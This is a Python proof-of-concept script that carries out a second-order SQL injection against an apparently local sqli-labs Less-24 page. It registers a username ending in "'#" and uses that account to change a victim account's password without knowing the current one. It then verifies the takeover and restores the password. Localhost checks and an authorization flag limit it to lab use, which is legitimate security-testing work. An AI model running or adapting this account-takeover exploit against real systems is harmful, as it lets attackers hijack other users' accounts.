#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQLI-005 local-lab POC draft: second-order SQL injection.

Only local authorized lab targets are accepted. The script uses dedicated
test accounts and deliberately does not target "admin" or any real account.
It writes no credentials to disk and prints no passwords.
"""

import argparse
import http.cookiejar
import json
import sys
from urllib import error, parse, request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
UA = "sqli005-lab-poc/1.0"


class NoRedirect(request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def checked_url(base, path):
    if not path.startswith("/"):
        path = "/" + path
    url = parse.urljoin(base.rstrip("/") + "/", path.lstrip("/"))
    parts = parse.urlsplit(url)
    if parts.scheme not in {"http", "https"} or parts.hostname not in ALLOWED_HOSTS:
        raise ValueError("refusing non-local target: %s" % url)
    return url


class Client:
    def __init__(self, timeout):
        self.timeout = timeout
        self.jar = http.cookiejar.CookieJar()
        self.opener = request.build_opener(
            request.HTTPCookieProcessor(self.jar), NoRedirect()
        )

    def _send(self, req):
        try:
            with self.opener.open(req, timeout=self.timeout) as resp:
                return resp.status, dict(resp.headers), resp.read().decode("utf-8", "replace")
        except error.HTTPError as exc:
            return exc.code, dict(exc.headers), exc.read().decode("utf-8", "replace")
        except error.URLError as exc:
            raise RuntimeError("connection/protocol error: %s" % exc.reason) from exc

    def get(self, url):
        req = request.Request(url, method="GET", headers={"User-Agent": UA})
        return self._send(req)

    def post(self, url, fields):
        body = parse.urlencode(fields).encode("utf-8")
        req = request.Request(
            url,
            data=body,
            method="POST",
            headers={
                "User-Agent": UA,
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
        return self._send(req)


def post_register(client, url, user, password):
    status, headers, body = client.post(
        url,
        {
            "submit": "submit",
            "username": user,
            "password": password,
            "re_password": password,
        },
    )
    if "already exists" in body.lower():
        return "exists"
    if "Redirecting you to login page" in body or "Less-24-user-created.jpg" in body:
        return "created"
    raise RuntimeError(
        "register failed status=%s location=%s body=%r"
        % (status, headers.get("Location"), body[:400])
    )


def post_login(client, url, user, password):
    status, headers, body = client.post(
        url, {"login_user": user, "login_password": password}
    )
    location = headers.get("Location", "")
    if status in (301, 302, 303, 307, 308) and "logged-in.php" in location:
        return True, "status=%s location=%s" % (status, location)
    return False, "status=%s location=%s body=%r" % (status, location, body[:300])


def post_change(client, url, current_password, new_password):
    status, headers, body = client.post(
        url,
        {
            "submit": "submit",
            "current_password": current_password,
            "password": new_password,
            "re_password": new_password,
        },
    )
    location = headers.get("Location", "")
    if "Password successfully updated" in body:
        return True, "status=%s success-marker" % status
    return False, "status=%s location=%s body=%r" % (status, location, body[:300])


def must(condition, message):
    if not condition:
        raise RuntimeError(message)


def main():
    parser = argparse.ArgumentParser(
        description="SQLI-005 second-order SQL injection local-lab draft"
    )
    parser.add_argument("--base-url", required=True, help="e.g. http://127.0.0.1/sqli-labs/Less-24/")
    parser.add_argument("--register-path", default="/new_user.php")
    parser.add_argument("--login-path", default="/index.php")
    parser.add_argument("--change-path", default="/logged-in.php")
    parser.add_argument("--victim-user", default="sqli005_victim")
    parser.add_argument("--victim-old-password", required=True)
    parser.add_argument("--victim-new-password", required=True)
    parser.add_argument("--control-user", default="sqli005_control")
    parser.add_argument("--control-password", required=True)
    parser.add_argument("--attacker-password", required=True)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument(
        "--i-have-authorization",
        action="store_true",
        required=True,
        help="confirm this is a local, authorized lab",
    )
    args = parser.parse_args()

    base = args.base_url.rstrip("/")
    parts = parse.urlsplit(base)
    if parts.scheme not in {"http", "https"} or parts.hostname not in ALLOWED_HOSTS:
        raise SystemExit("refusing non-local base URL: %s" % base)
    if args.victim_old_password == args.victim_new_password:
        raise SystemExit("victim old and new passwords must differ")

    register_url = checked_url(base, args.register_path)
    login_url = checked_url(base, args.login_path)
    change_url = checked_url(base, args.change_path)
    payload_user = args.victim_user + "'#"
    control_tmp = "Sqli005Tmp!"
    if control_tmp == args.control_password:
        control_tmp = "Sqli005Tmp!2"

    result = {
        "sample_id": "SQLI-005",
        "payload_username": payload_user,
        "urls": {
            "register": register_url,
            "login": login_url,
            "change": change_url,
        },
    }
    control_tmp_applied = False
    control_client = None
    victim_changed = False

    try:
        reg = Client(args.timeout)
        for label, user, password in (
            ("victim", args.victim_user, args.victim_old_password),
            ("control", args.control_user, args.control_password),
            ("payload", payload_user, args.attacker_password),
        ):
            result["register_" + label] = post_register(
                reg, register_url, user, password
            )

        control_client = Client(args.timeout)
        ok, detail = post_login(
            control_client, login_url, args.control_user, args.control_password
        )
        must(ok, "control login failed: " + detail)
        ok, detail = post_change(
            control_client, change_url, args.control_password, control_tmp
        )
        must(ok, "control positive change failed: " + detail)
        control_tmp_applied = True
        ok, detail = post_change(
            control_client, change_url, control_tmp, args.control_password
        )
        must(ok, "control restore change failed: " + detail)
        control_tmp_applied = False
        result["control_positive"] = "normal password change accepted"

        neg = Client(args.timeout)
        ok, detail = post_login(
            neg, login_url, args.control_user, args.control_password
        )
        must(ok, "control negative login failed: " + detail)
        ok, detail = post_change(
            neg, change_url, "SQRI005-wrong-control", args.control_password
        )
        must(not ok, "control negative unexpectedly succeeded: " + detail)
        must(
            "failed.php" in detail or "status=302" in detail or "status=303" in detail,
            "control negative did not show the expected rejection",
        )
        result["control_negative"] = "wrong current_password rejected"

        atk = Client(args.timeout)
        ok, detail = post_login(atk, login_url, payload_user, args.attacker_password)
        must(ok, "payload-account login failed: " + detail)
        ok, detail = post_change(
            atk, change_url, "SQRI005-wrong-current", args.victim_new_password
        )
        victim_changed = True
        must(ok, "second-order change failed: " + detail)
        result["second_order_change"] = (
            "success marker returned while current_password was wrong"
        )

        new_client = Client(args.timeout)
        new_ok, new_detail = post_login(
            new_client, login_url, args.victim_user, args.victim_new_password
        )
        old_client = Client(args.timeout)
        old_ok, old_detail = post_login(
            old_client, login_url, args.victim_user, args.victim_old_password
        )
        result["victim_new_password_login"] = "accepted" if new_ok else "rejected"
        result["victim_old_password_login"] = "accepted" if old_ok else "rejected"
        must(
            new_ok and not old_ok,
            "victim password verification failed: new=%s old=%s"
            % (new_detail, old_detail),
        )
        result["verification"] = "victim password changed; old password rejected"
    except Exception as exc:
        result["error"] = str(exc)
    finally:
        if control_tmp_applied and control_client is not None:
            try:
                ok, detail = post_change(
                    control_client, change_url, control_tmp, args.control_password
                )
                result["control_restore"] = "ok" if ok else "FAILED: " + detail
            except Exception as exc:
                result["control_restore"] = "FAILED: %s" % exc
        if victim_changed:
            try:
                restore = Client(args.timeout)
                ok, detail = post_login(
                    restore, login_url, payload_user, args.attacker_password
                )
                if not ok:
                    raise RuntimeError("restore login failed: " + detail)
                ok, detail = post_change(
                    restore,
                    change_url,
                    "SQRI005-wrong-current",
                    args.victim_old_password,
                )
                if not ok:
                    raise RuntimeError("restore change failed: " + detail)
                check = Client(args.timeout)
                ok, _ = post_login(
                    check, login_url, args.victim_user, args.victim_old_password
                )
                result["victim_restore"] = "verified" if ok else "FAILED verification"
            except Exception as exc:
                result["victim_restore"] = "MANUAL RESTORE REQUIRED: %s" % exc

    print(json.dumps(result, ensure_ascii=False, indent=2))
    return 0 if "error" not in result else 2


if __name__ == "__main__":
    sys.exit(main())
